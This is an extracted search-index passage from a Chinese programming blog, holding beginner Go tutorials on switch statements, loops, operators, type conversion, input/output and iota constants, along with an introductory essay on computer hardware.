\"fmt\"/*@星座诊所2(switch)根据用户输入的出生月份猜测其星座：·白羊（4） 金牛（5） 双子（6） 巨蟹（7） 狮子（8） 处女（9） 天平（10） 天蝎（11） 射手（12） 摩羯（1） 水瓶（2） 双鱼（3）·使用单点case判断其星座；·使用单点case集合判断其季节（春夏秋冬）·使用自由条件case判断用户具体星座*/func main041() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) fmt.Printf(\"month=%d\", month) /* 对month的可能取值，做单点判断 */ switch month &#123; case 1: fmt.Printf(\"你大概率是%s座\\n\", \"摩羯\") case 2: fmt.Printf(\"你大概率是%s座\\n\", \"水瓶\") case 3: fmt.Printf(\"你大概率是%s座\\n\", \"双鱼\") case 4: fmt.Printf(\"你大概率是%s座\\n\", \"白羊\") case 5: fmt.Printf(\"你大概率是%s座\\n\", \"金牛\") case 6: fmt.Printf(\"你大概率是%s座\\n\", \"双子\") case 7: fmt.Printf(\"你大概率是%s座\\n\", \"巨蟹\") case 8: fmt.Printf(\"你大概率是%s座\\n\", \"狮子\") case 9: fmt.Printf(\"你大概率是%s座\\n\", \"处女\") case 10: fmt.Printf(\"你大概率是%s座\\n\", \"天平\") case 11: fmt.Printf(\"你大概率是%s座\\n\", \"天蝎\") case 12: fmt.Printf(\"你大概率是%s座\\n\", \"射手\") //month的值没有落在上述任何一种情形中 //default是可选的 default: fmt.Println(\"你就是传说中的蛇夫座\") &#125;&#125;/*·使用单点case集合判断其季节（春夏秋冬）*/func main042() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) switch month &#123; case 12, 1, 2: fmt.Println(\"你出生在冬天\") case 3, 4, 5: fmt.Println(\"你出生在春天\") case 6, 7, 8: fmt.Println(\"你出生在夏天\") case 9, 10, 11: fmt.Println(\"你出生在秋天\") default: fmt.Println(\"你出生在火星\") &#125;&#125;/*·使用自由条件case判断其季节（春夏秋冬）*/func main043() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) // 没有明确指定switch的对象，case可以跟任意判断条件 switch &#123; case month &gt;= 3 &amp;&amp; month &lt;= 5: fmt.Println(\"你出生在春天\") case month &gt;= 6 &amp;&amp; month &lt;= 8: fmt.Println(\"你出生在夏天\") case month &gt;= 9 &amp;&amp; month &lt;= 11: fmt.Println(\"你出生在秋天\") case month == 12 || month == 1 || month == 2: fmt.Println(\"你出生在冬天\") default: fmt.Println(\"你出生在火星\") &#125;&#125;/*使用fallthrough强制滚动到下一个分支并执行*/func main044() &#123; fmt.Println(\"请输入你的出生月份(1-12)\") var month int fmt.Scan(&amp;month) // 没有明确指定switch的对象，case可以跟任意判断条件 switch &#123; case month &gt;= 3 &amp;&amp; month &lt;= 5: fmt.Println(\"你出生在春天\") //强制执行下一个分支条件 fallthrough case month &gt;= 6 &amp;&amp; month &lt;= 8: fmt.Println(\"你出生在夏天\") fmt.Println(\"我们出生在上半年\") case month &gt;= 9 &amp;&amp; month &lt;= 11: fmt.Println(\"你出生在秋天\") //强制执行下一个分支条件 fallthrough case month == 12 || month == 1 || month == 2: fmt.Println(\"你出生在冬天\") fmt.Println(\"我们出生在下半年\") default: fmt.Println(\"你出生在火星\") &#125;&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang流程控制","slug":"Golang流程控制","permalink":"https://xiaowuyoucy.github.io/tags/Golang流程控制/"}]},{"title":"Golang类型转换及移位运算","slug":"201911180045","date":"2019-11-17T16:46:00.000Z","updated":"2019-11-17T17:24:35.343Z","comments":true,"path":"2019/11/18/201911180045/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/18/201911180045/","excerpt":"","text":"类型转换 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/*类型转换强化整型和浮点型可以直接强制转换字符串和数值的转换用strconv.ParseInt和strconv.ParseFloat*/func main024() &#123; var a int = 123 var b float64 = 456.78 //将整型转换为浮点型 aFloat := float64(a) //%T类型占位符，%v是值占位符 fmt.Printf(\"aFloat的类型是%T,值是%v\\n\",aFloat,aFloat) //浮点型转整型，小数部分扔掉 //bInt := int32(b) bInt := int(b) fmt.Printf(\"bInt的类型是%T,值是%v\\n\",bInt,bInt) //字符串转整型 resultInt, _ := strconv.ParseInt(\"123\", 0, 64) fmt.Printf(\"resultInt的类型是%T,值是%v\\n\",resultInt,resultInt) //字符串转浮点型 resultFloat, _ := strconv.ParseFloat(\"123.45\", 64) fmt.Printf(\"resultFloat的类型是%T,值是%v\\n\",resultFloat,resultFloat)&#125;/*移位运算强化*/func main() &#123; //10111 var a uint8 = 23 fmt.Println(a&gt;&gt;3)//2 //左移 fmt.Println(a&lt;&lt;3)//184 //继续移动，从左侧溢出，当前无符号，最高位是数据位而非符号位 fmt.Println(a&lt;&lt;5)//224 //定义有符号8位整型 var b int8 = 23 //10111000,最高位为1，为负数，为补码，减一取反得其原码（原码到补码取反加一的逆向） fmt.Println(b&lt;&lt;3)//-72&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang类型转换及移位运算","slug":"Golang类型转换及移位运算","permalink":"https://xiaowuyoucy.github.io/tags/Golang类型转换及移位运算/"}]},{"title":"Golang循环结构","slug":"201911190001","date":"2019-11-17T16:03:00.000Z","updated":"2019-11-18T19:33:59.906Z","comments":true,"path":"2019/11/18/201911190001/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/18/201911190001/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175package mainimport ( \"fmt\" \"math/rand\" \"time\")/*无限循环，死循环输出我爱拉芳，一直到死*/func main051() &#123; for &#123; fmt.Println(\"我爱拉芳\") time.Sleep(1 * time.Second) &#125;&#125;/*有限循环输出我爱拉芳，100遍for 起始条件;循环条件;增长条件&#123; 循环体&#125;*/func main052() &#123; /* var i int for i = 1; i &lt;= 10; i++ &#123; fmt.Printf(\"我爱拉芳%d年了\\n\", i) time.Sleep(1000 * time.Millisecond) &#125;*/ for i := 0; i &lt; 10; i++ &#123; fmt.Printf(\"我爱拉芳%d年了\\n\", i) time.Sleep(1000 * time.Millisecond) &#125; fmt.Println(\"终于可以爱别人了！\")&#125;/*倒序循环*/func main053() &#123; for i := 10; i &gt;= 1; i-- &#123; fmt.Println(i) time.Sleep(500 * time.Millisecond) &#125; fmt.Println(\"发射！\")&#125;/*打印 2 4 6 8 10... 100*/func main054() &#123; for i := 2; i &lt; 101; i += 2 &#123; fmt.Println(i) &#125;&#125;/*打一个10*5的“你妹”矩阵*/func main055() &#123; for j := 0; j &lt; 5; j++ &#123; //在同一行打印十个你妹 for i := 0; i &lt; 10; i++ &#123; fmt.Print(\"你妹\\t\\t\") &#125; fmt.Print(\"\\n\") &#125;&#125;/*打印九九乘法表*/func main056() &#123; for i := 1; i &lt;= 9; i++ &#123; for j := 1; j &lt;= i; j++ &#123; fmt.Print(j, \"*\", i, \"=\", j*i, \" \") &#125; fmt.Print(\"\\n\") &#125;&#125;func GetRandom() int &#123; /*获得随机数*/ //当前时间距离1970年0时所逝去的时间纳秒数 seed := time.Now().UnixNano() //使用当前时间纳秒作为随机数种子 myRandom := rand.New(rand.NewSource(seed)) //n := rand.Intn(1000) n := 100 + myRandom.Intn(900) //fmt.Println(n) //将结果随机数返回给调用者 return n&#125;/*·随机生成一个3位数答案·让用户输入其猜想·反馈给用户：猜大了、猜小了、猜对了·如果没猜对，就继续猜·猜对了就退出游戏·如果用户输入“-1”，就直接退出游戏*/func main057() &#123;START: //随机生成一个3位数答案 answer := GetRandom() fmt.Println(answer) var count int = 0 for &#123; /*让用户输入其猜想*/ var guess int fmt.Println(\"骚年请输入你的猜想(100-999),-1=退出，0=重玩，\") fmt.Scan(&amp;guess) /*看看用户是否想退出*/ if guess == -1 &#123; break &#125; else if guess == 0 &#123; goto START &#125; /*反馈给用户：猜大了、猜小了、猜对了*/ count ++ if guess &gt; answer &#123; fmt.Printf(\"猜大了,共用了%d次\\n\", count) &#125; else if guess &lt; answer &#123; fmt.Printf(\"猜小了,共用了%d次\\n\", count) &#125; else &#123; fmt.Printf(\"猜对了,共用了%d次\\n\", count) //跳出循环 break &#125; &#125; fmt.Println(\"GAME OVER\")&#125;/*打印1-49，逢5的整数倍就跳过*/func main058() &#123; var i int = 0 for &#123; i++ if i &gt; 49&#123; //跳出整个循环 break &#125; if i%5 == 0 &#123; //跳过本次循环的剩余部分，直接进入下一次循环 continue &#125; fmt.Print(\"当前是：\") fmt.Println(i) &#125; fmt.Println(\"GAME OVER\")&#125;func main() &#123; fmt.Println(GetRandom())&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang循环结构","slug":"Golang循环结构","permalink":"https://xiaowuyoucy.github.io/tags/Golang循环结构/"}]},{"title":"Golang程序运算","slug":"201911160050","date":"2019-11-15T16:51:18.000Z","updated":"2019-11-17T09:00:06.792Z","comments":true,"path":"2019/11/16/201911160050/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/16/201911160050/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153package mainimport ( \"fmt\" \"math\")func main() &#123; var a int = 10 /*自加1*/ //a = a + 2 //a += 2 //a++ /*自减1*/ //a = a - 1 //a -= 2 //a-- /*自乘运算*/ //a = a * 2 //a *= 2 //a = a / 2 //a /= 2 /*自求模（余）*/ //a = a % 3 a %= 3 fmt.Println(a)&#125;/*数学运算*/func main051() &#123; /*加减乘除，求余*/ fmt.Println(\"5+3=\", 5+3) //8 fmt.Println(\"5-3=\", 5-3) //2 fmt.Println(\"5*3=\", 5*3) //15 fmt.Println(\"5/3=\", 5/3) //1 fmt.Println(\"5%3=\", 5%3) //2 /*乘方和开方*/ fmt.Println(\"5^3=\", math.Pow(5, 3)) //125 fmt.Println(\"125开三次方=\", math.Pow(125.0, 1.0/3.0)) //5 /* 四舍五入 负数的四舍五入原则：先对绝对值四舍五入，再加负号 */ fmt.Println(\"3.49的四舍五入=\", math.Round(3.49)) //3 fmt.Println(\"3.51的四舍五入=\", math.Round(3.51)) //4 fmt.Println(\"-3.49的四舍五入=\", math.Round(-3.49)) //-3 fmt.Println(\"-3.51的四舍五入=\", math.Round(-3.51)) //-4 /*纯舍与纯入*/ fmt.Println(\"3.49的四舍五入=\", math.Floor(3.99)) //3 fmt.Println(\"3.51的四舍五入=\", math.Ceil(3.01)) //4 /*绝对值*/ fmt.Println(\"-3.14的绝对值\", math.Abs(-3.14)) //3.14 /* 三角函数： 参数必须是弧度而不是角度 */ fmt.Println(\"30°的正弦=\", math.Sin((30.0/180)*math.Pi)) fmt.Println(\"30°的余弦=\", math.Cos((30.0/180)*math.Pi)) fmt.Println(\"30°的正切=\", math.Tan((30.0/180)*math.Pi)) fmt.Println(\"30°的余切=\", 1.0/math.Tan((30.0/180)*math.Pi)) /*反三角函数*/ fmt.Println(\"正弦为0.5的角度是\", math.Asin(0.5)) //0.5235987755982989=30度的弧度表示&#125;/*比较运算比较运算符：&gt;,&lt;,==,!=,&gt;=,&lt;=比较运算的结果是布尔值：true或false*//*逻辑运算逻辑与：两者都为真，结果才为真逻辑或：两者只要有一个为真，结果就为真逻辑非：非真为假，非假为真*/func main052() &#123; a1 := (1+1 == 2) //true a0 := (1+1 != 2) //false b1 := (1+1 &gt;= 2) //true b0 := (1+1 &lt; 2) //false fmt.Println(a1, a0, b1, b0) /*逻辑与*/ fmt.Println(a1 &amp;&amp; b1) //true fmt.Println(a1 &amp;&amp; b0) //false fmt.Println(a0 &amp;&amp; b1) //false fmt.Println(a0 &amp;&amp; b0) //false /*逻辑或*/ fmt.Println(a1 || b1) //true fmt.Println(a1 || b0) //true fmt.Println(a0 || b1) //true fmt.Println(a0 || b0) //false /*逻辑或*/ fmt.Println(!a1) //false fmt.Println(!a0) //true fmt.Println(!b1) //false fmt.Println(!b0) //true&#125;/*位运算&amp; 按位与 两位都为1，结果才为1| 按位或 只要有一位为1，结果就为1^ 按位异或 两位不相同，结果就为1，否则就为0&lt;&lt;&gt;&gt;*/func main053() &#123; //a := 23 //b := 34 var a uint8 = 23 var b uint8 = 34 fmt.Println(a &amp; b) //2 fmt.Println(a | b) //55 fmt.Println(a ^ b) //53 /*移位运算*/ fmt.Println(a &lt;&lt; 2) //92 fmt.Println(a &gt;&gt; 2) //5 /* 左移的溢出 a为无符号8位整型，向左侧溢出后，最高位为数据位 */ fmt.Println(a &lt;&lt; 4) //112 fmt.Println(a &lt;&lt; 5) //1110,0000无符号为224 /* 左移的溢出 a为有符号8位整型，向左侧溢出后，最高位为符号位——要考虑正负数问题 最高位为0，非负数 最高位为1，负数的反码，-1再取反得到绝对值 */ var c int8 = 23 fmt.Println(c &lt;&lt; 5) //1110,0000有符号-32&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang程序运算","slug":"Golang程序运算","permalink":"https://xiaowuyoucy.github.io/tags/Golang程序运算/"}]},{"title":"Golang基础类型占位符","slug":"20191116038","date":"2019-11-15T16:40:18.000Z","updated":"2019-11-15T16:46:18.416Z","comments":true,"path":"2019/11/16/20191116038/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/16/20191116038/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package mainimport \"fmt\"/*认识基本数据类型*/func main041() &#123; //整型 var a byte = 123 var b rune = 123 var c int = 123 var d uint = 123 fmt.Println(a,b,c,d) //浮点型 var rmb float32 = 1.23 //var atomRadius float64 = 1.234567890 var atomRadius = 1.234567890 fmt.Println(rmb,atomRadius) //字符串型 var name string = \"张三\" fmt.Println(name) //布尔型 var isClever = true var isBrave bool = false fmt.Println(isClever,isBrave) /*查看变量的类型*/ fmt.Printf(\"a的类型是%T\\n\",a) fmt.Printf(\"isClever的类型是%T\\n\",isClever) fmt.Printf(\"atomRadius的类型是%T\\n\",atomRadius) fmt.Printf(\"1.23的类型是%T\\n\",1.23) fmt.Printf(\"你妹的类型是%T\",\"你妹\") fmt.Printf(\"3+4i的类型是%T\",3+4i)&#125;/*基本类型占位符%s 字符串占位符%d 整型占位符（十进制）%f 浮点型占位符,%.2f精确到小数点后两位%t 布尔占位符*/func main() &#123; //使用占位符进行输出 fmt.Printf(\"我是%s,今年%d岁了，比特币余额%.2f，我美吗？——%t\\n\",\"比尔\",18,1.234567890,false) //输出时使用5字符宽度(默认右对齐) fmt.Printf(\"我是%5s,今年%5d岁了，比特币余额%5.2f，我美吗？——%5t\\n\",\"比尔\",18,1.234567890,false) //5位字符宽度，左对齐 fmt.Printf(\"我是%-5s,今年%-5d岁了，比特币余额%-5.2f，我美吗？——%-5t\\n\",\"比尔\",18,1.234567890,false) //打印并换行 fmt.Println(\"陈述完毕！\")&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang基础类型占位符","slug":"Golang基础类型占位符","permalink":"https://xiaowuyoucy.github.io/tags/Golang基础类型占位符/"}]},{"title":"Golang标准输入与输出","slug":"201911152305","date":"2019-11-15T15:06:01.000Z","updated":"2019-11-15T15:42:39.487Z","comments":true,"path":"2019/11/15/201911152305/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911152305/","excerpt":"","text":"每次接收一个用户输入 1234567891011121314151617181920212223242526272829303132333435package mainimport ( \"fmt\" \"strconv\")func main031() &#123; //定义a,b两个字符串型变量，用于接收用户的输入（用户的任何输入在类型转换前都是字符串） var a, b string //提示用户输入两个数 fmt.Println(\"骚年请输入相加的两个数：\") //将用户输入的第一个“数据”存入a的内存地址（&amp;a代表对变量a取地址） fmt.Scan(&amp;a) //将用户的第二个输入存入b的内存地址 fmt.Scan(&amp;b) fmt.Println(\"a=\", a) //12 fmt.Println(\"b=\", b) //34 // 字符串的相加实际是拼接操作 fmt.Println(\"a+b=\", a+b) //1234 // 先将字符串a,b转化为64位整型，再做相加计算 //aInt，bInt的类型为整型 aInt, _ := strconv.ParseInt(a, 0, 64) bInt, _ := strconv.ParseInt(b, 0, 64) fmt.Println(\"a+b=\", aInt+bInt) //输出结果&#125; 一次性接收多个用户输入 12345678910111213func main() &#123; fmt.Println(\"请输入两个女神的名字\") //定义两个字符串变量 var godess1, godess2 string //一次性接收两个用户输入，分别存入godess1, godess2变量的内存 //多次输入之间用空格分隔 fmt.Scan(&amp;godess1, &amp;godess2) fmt.Println(\"你喜欢\", godess1) fmt.Println(\"你喜欢\", godess2)&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang基础","slug":"Golang基础","permalink":"https://xiaowuyoucy.github.io/tags/Golang基础/"},{"name":"Golang标准输入与输出","slug":"Golang标准输入与输出","permalink":"https://xiaowuyoucy.github.io/tags/Golang标准输入与输出/"}]},{"title":"iota定义常量组","slug":"201911152154","date":"2019-11-15T13:56:00.000Z","updated":"2019-11-15T16:26:26.564Z","comments":true,"path":"2019/11/15/201911152154/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911152154/","excerpt":"","text":"iota常量组概述 第一个常量的iota，值为0 后面的常量自动沿用第一个常量的表达式 后面常量中的iota会自动递增 12345678910111213141516171819202122232425262728293031323334353637383940414243/** * @Author: Administrator * @Description: * @File: 2 使用ioat定义常量组 * @Version: 1.13.4 * @Date: 2019/11/15 21:34 */package mainimport \"fmt\"/*使用iota 定义一组常量后边的常量(iota)会以n+1的递增，iota的序号默认是以0开始的*///案例1const ( USA = iota + 1 China Russia Britain France)func main1() &#123; fmt.Println(USA,China,Russia,Britain,France) //输出结果：1 2 3 4 5&#125;//案例2const ( Spring = (iota + 1) * 2 Summer Autumn Winter)func main() &#123; fmt.Println(Spring,Summer,Autumn,Winter) //输出结果：2 4 6 8&#125;","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"iota定义常量组","slug":"iota定义常量组","permalink":"https://xiaowuyoucy.github.io/tags/iota定义常量组/"}]},{"title":"Golang","slug":"201911152138","date":"2019-11-15T13:38:18.000Z","updated":"2019-12-04T17:07:39.006Z","comments":true,"path":"2019/11/15/201911152138/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911152138/","excerpt":"","text":"Golang基础 1.1 常量、变量、表达式 1.2 iota定义常量组 1.3 标准输入与输出 1.4 基础类型占位符 1.5 程序运算 1.6 类型转换及移位运算 1.7 流程控制 1.8 循环结构 1.9 GOTO语句 2.0 延时执行 defer 2.1 函数 2.2 匿名函数 2.3 闭包函数 2.4 指针","categories":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://xiaowuyoucy.github.io/tags/Golang/"}]},{"title":"计算机基础","slug":"201910190031","date":"2019-11-15T11:09:18.000Z","updated":"2019-11-17T09:02:41.207Z","comments":true,"path":"2019/11/15/201910190031/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201910190031/","excerpt":"","text":"简谈计算机 人类的起源直到今天都是一个未解之谜或者有争议性的话题。 这个问题引申一下可以诞生几个新的问题： 火星曾经有过生命吗？ 地球的起源。 月球的起源。 宇宙的起源。 我们常常听说，光的速度是每秒30万公里，地球诞生46亿年。 恐龙6500万年被毁灭。 人类是由猿猴演变而来。 水是生命的起源。 很多人把这些从小听到大的科普知识当做真理，公理去视为衡量一切的标准。 但人类随着科学的进步，历史上曾经视为一些公理的知识已经被推翻。 谁能肯定光速在传播的过程中，不会像声音一样因为不同的介质而发生改变。 谁能肯定人类测量历史，年份的技术手段是精确无误或者误差很小。 谁能肯定生命的形成必须倚靠氧气呢？ 我们带着求知的心理去学习，去探索，去研究。 但也要提醒自己，我此时此刻所处的这个时代，我今天所学的知识，不一定就是完全准确的，对未知要有一颗谦卑敬畏之心。 亚里斯多德时代奉为真理的东西很快就被推翻了，现在没掌握的东西没准哪天就被发现掌握了。 有兴趣的朋友，可以通过搜索引擎看一下让人震惊的“电子双缝干涉实验” 。 虽然未必每一个人都要成为“计算机科学家”或者“程序员”。 但当你开始接触这个专业的时候，从某种程度上说：“你也是踏入了科学世界的大门。” 人类经历了石器时代、青铜时代、铁器时代、以及标志着近代的蒸汽时代、电气时代 现在踏入了信息时代，下一个时代也许是生物智能时代…… 在电气时代发现了电流，电子、电磁、电磁波、也有了世界第一台电子计算机。 后来又设计了机器语言、汇编语言、各种各样的编程语言，其中比较经典的是直到今天还有很多人学习使用的C语言、C++。 Unix、Linux、Windows操作系统也在不久之后诞生了第一个版本。 1999年上映了一部电影《异次元骇客》，电影讲述了用计算机虚拟出了洛杉矶，随着科学的发展以及人类对宇宙的观察。 有了一种新的猜测： 我们人类是被创造和设计的，就像程序员编写的游戏一样。 各种各样的自然法则，大气压，水压，重力，光速，声速等都是被提前设定好的。 著名的小说《三体》，电影《超时空接触》《星际穿越》《最远的地方》《黑客帝国》《月球》等艺术作品也拓展了我们想象的边缘。 如果你喜欢看一些网络小说和电影，那《无限恐怖》小说更是让人眼前一亮，脑洞大开。 人类与身居来的好奇心，不断地探索中，有很多我们肉眼无法看到的神秘力量。 这些东西对我们生活中吃喝拉撒似乎没有任何的意义，但只要把眼光抬高一点，仰望星空，一种奇妙难以言喻的心情，那是我们对未知，对真相的渴望。 温家宝总理2007年5月14日公布了一首诗歌《仰望星空》 一个民族有一些关注天空的人，他们才有希望；一个民族只是关心脚下的事情，那是没有未来的。 我们的民族是大有希望的民族！我希望同学们经常地仰望天空，学会做人，学会思考，学会知识和技能，做一个关心世界和国家命运的人。 仰望星空 我仰望星空， 它是那样辽阔而深邃； 那无穷的真理， 让我苦苦地求索追随。 我仰望星空， 它是那样庄严而圣洁； 那凛然的正义， 让我充满热爱、感到敬畏。 我仰望星空， 它是那样自由而宁静； 那博大的胸怀， 让我的心灵栖息依偎。 我仰望星空， 它是那样壮丽而光辉； 那永恒的炽热， 让我心中燃起希望的烈焰、响起春雷。 电脑结构 以上结构图，最初是由 冯·诺伊曼 （计算机科学家）所提出，又称之为”冯·诺伊曼结构“ 图中分别为：输入设备、输出设备、存储器、运算器和控制器；这些都是计算机的主要部件。 我们在玩电脑的时候，我们使用键盘鼠标来操作电脑，我们在和其他人QQ聊天的时候，鼠标可以帮我们选中聊天的人， 打开聊天窗口，键盘则是负责打字，帮我们输入聊天的内容。 我们在操作键盘鼠标的时候，其实都是在告诉电脑来做什么的。我们管键盘和鼠标叫输入设备。 输入设备： 向电脑输入数据和信息的设备。除了键盘。除了键盘鼠标，其他输入设备还包括触摸板、麦克风、摄像头，游戏手柄、扫描仪等等 显示器用来向我们展示画面，显示内容，音箱则播放音乐给我们听，我们管他们叫输出设备。 输出设备： 将电脑中的信息输出给用户的设备。常用的输入设备有：显示器、音箱、打印机、投影仪等等 我们买来电脑，如果只有键盘鼠标、显示器、音箱，我们能玩电脑么？肯定不能。 那么其实电脑机箱才是真正的工作的设备， 输入输出设备只是用来让我们和电脑机箱来做交互的。 那机箱内部都有什么呢？我们看一下下面的图片： 我们来看一下这里的零件都有什么用 主板 连接所有其他设备的设备，是其他设备的载体，主板主要是为CPU、内存、显卡、硬盘等提供平台，相当于人体的躯干，关联着各个器官。 中央处理器（Cntral Pocessing Uit ） CPU：中央处理单元(Cntral Pocessing Uit)的缩写，也叫处理器，是计算机的运算核心和控制核心。人靠大脑思考，电脑靠CPU来运算、控制。让电脑的各个部件顺利工作，起到协调和控制作用。 硬盘 硬盘：存储资料和软件等数据的设备，有容量大，断电数据不丢失的特点。也被人们称之为“数据仓库”。 内存 内存：1. 负责硬盘等硬件上的数据与CPU之间数据交换处理；2. 缓存系统中的临时数据。3. 断电后数据丢失。 显卡 显卡：显示器想要呈现画面，显卡是关键。简单来说，就是负责在显示屏上显示一切信息。打个比方，它就像是人的眼睛，没有了它，电脑就无法驱动形成图像了。 显卡性能好，电脑的图形处理能力就高，尤其在玩游戏时更能发现这个（所以很多游戏会要求显卡性能）对玩家而言，最好选择独立显卡。不过，如果不玩大型游戏，CPU内置核心显卡也基本能满足要求;缺点： 系统功耗有所加大，发热量也较大，额外购买 。 电源 电源：将电压220伏的市电转换为低等电压，然后送到主板及各个硬件！供电！电脑运行需要电力，而电源就是为此供电的，也可以说它在为电脑提供一切动力。电源决定了电脑的稳定性。它和人体心脏功能类似，都是提供动力的核心。 网卡 网卡：提供联网的硬件，一般集成在主板上。 其他… 说了这么多，其实最最重要的设备是什么呢？ CPU、硬盘、内存。 现在我们来说一下CPU、硬盘、内存三者之间的关系。 首先 ,我们先回想一下三者的作用： CPU：是计算机的运算核心和控制核心，让电脑的各个部件顺利工作，起到协调和控制作用。 硬盘：存储资料和软件等数据的设备，有容量大，断电数据不丢失的特点。 也被人们称之为“数据仓库”。 内存：1. 负责硬盘等硬件上的数据与CPU之间数据交换处理；2. 缓存系统中的临时数据。3. 断电后数据丢失。 然后， 我们再来看一下程序是如何执行起来的。 当我们在电脑上打开QQ时（右键-打开 或者双击QQ图标），其实是通过鼠标（输入设备）向CPU发送了一条命令，CPU接收到这条命令后， QQ程序就从硬盘里被加载到内存（加载时不通过处理器，直接从硬盘加载程序到内存里），加载完成后，CPU就开始执行QQ程序。 程序执行起来后，CPU可以让QQ程序显示在我们的在显示器上。也就是你看到了QQ 程序运行起来了。如果这个时候，你用QQ截取了一张屏幕的图片， 那么这张图片会首先保存到内存，在没有退出截屏状态时，你可以在这张图片上写字、画线条，等你右键保存这张图片的时候，这张图片就会保存到硬盘里。 通过了解一个程序是如何运行起来的，我们就可以了解三者是如何工作的 。 可能有些人会不明白，如果程序是这样执行起来的话，那么为什么CPU不直接在硬盘里执行程序，而非要把程序放到内存后在执行呢？ 这里是有原因的。我们先来看几张图： 好点的企业用机械硬盘 ： 内存的读写速度： 通过上图我们可以看出，内存存取数据的速度比硬盘的存取速度快了10倍， 在某些环境里，硬盘和内存之间的速度差距可能会更大。 而CPU的速度比内存不知还要快多少倍。当我们把程序从硬盘放到内存以后，CPU就直接在内存运行程序，这样比CPU直接在硬盘运行程序就要快很多。 内存解决了一部分CPU运行过快，而硬盘数据存取太慢的问题。 提高了我们的电脑的运行速度。 内存就如同一条“高速车道”一般，数据由传输速度较慢的硬盘通过这条高速车道传送至CPU进行处理！ 但内存是带电存储的(一旦断电数据就会消失)，而且容量有限，所以要长时间储存程序或数据就需要使用硬盘。 其实内存在这里起了两个作用： \\1. 保存从硬盘读取的数据，提供给CPU使用 \\2. 保存CPU的一些临时执行结果，以便CPU下次使用或保存到硬盘 三者之间的关系： 简单来说，硬盘用来存储我们的程序和数据，当我们运行程序的时候，CPU首先接受到我们的命令，之后CPU是告诉硬盘，我要运行你存储的程序A， 你把程序A送到内存去。CPU对内存说，我让硬盘把程序A送到你这里来了，你保存一下。 等程序A被完整的送到内存之后。CPU就开始执行程序A。 过程就像上面说的，我们在举一个接近我们生活的例子。 如果说把硬盘比喻成一个大仓库，CPU比喻成加工车间，那么内存就是一个临时的小仓库；从距离上来说， 相比内存到CPU的距离和硬盘到内存的距离，内存和CPU的距离更短；硬盘（大仓库）用来保存车间需要用的原料和最终生产出来的商品。仓库太大，取出原料和存储商品太慢，耗时间。 内存（临时小仓库）：原料会先放到这里，小仓库，可以很快的找到需要的原料或商品。 CPU（车间）：从内存（小仓库）里拿到原料，生产商品。中间会有半成品，半成品可以放在内存（小仓库）里。","categories":[{"name":"简谈计算机","slug":"简谈计算机","permalink":"https://xiaowuyoucy.github.io/categories/简谈计算机/"}],"tags":[{"name":"计算机基础","slug":"计算机基础","permalink":"https://xiaowuyoucy.github.io/tags/计算机基础/"}]},{"title":"Golang常量与变量表达式","slug":"201911151907","date":"2019-11-15T11:09:18.000Z","updated":"2019-11-15T16:26:29.255Z","comments":true,"path":"2019/11/15/201911151907/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/11/15/201911151907/","excerpt":"","text":"1.常量与表里表达式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485/** * @Author: Administrator * @Description: * @File: 01常量变量表达式 * @Version: 1.13.4 * @Date: 2019/11/15 18:58 */// 包名（main包下的main函数是程序的入口）package main// 导入sdk（software developing kit）中的fmt包import \"fmt\"/*一次性定义多个常量定义在函数以外的常量对所有函数可见*/const ( lightSpeed = 300000 months = 12)/*一次性定义多个变量定义在函数以外的变量对所有函数可见*/var ( //驼峰风格的成员定义 yearSeconds = 365 * 24 * 3600 //首字母大写的成员对其它包可见 //YearSeconds = 365 * 24 * 3600 //小写字母+下划线风格的成员定义 //year_seconds = 365 * 24 * 3600 //一个月有30天 monthDays = 30)// 入口函数（main包下的main函数是程序的入口）func main01() &#123; // 定义圆周率常量 const pi = 3.14 // 定义圆的半径变量 var radius = 10.0 // 定义圆面积变量 var area = 0.0 // 使用表达式求圆的面积，赋值给面积变量 area = pi * radius * radius // 输出结果 fmt.Println(\"圆的面积是\", area)&#125;// 访问全局常量和变量（写在函数外部的成员可以被当前包下的所有函数访问）func main02() &#123; //计算一光年的距离 //var lightYearDistance = lightSpeed 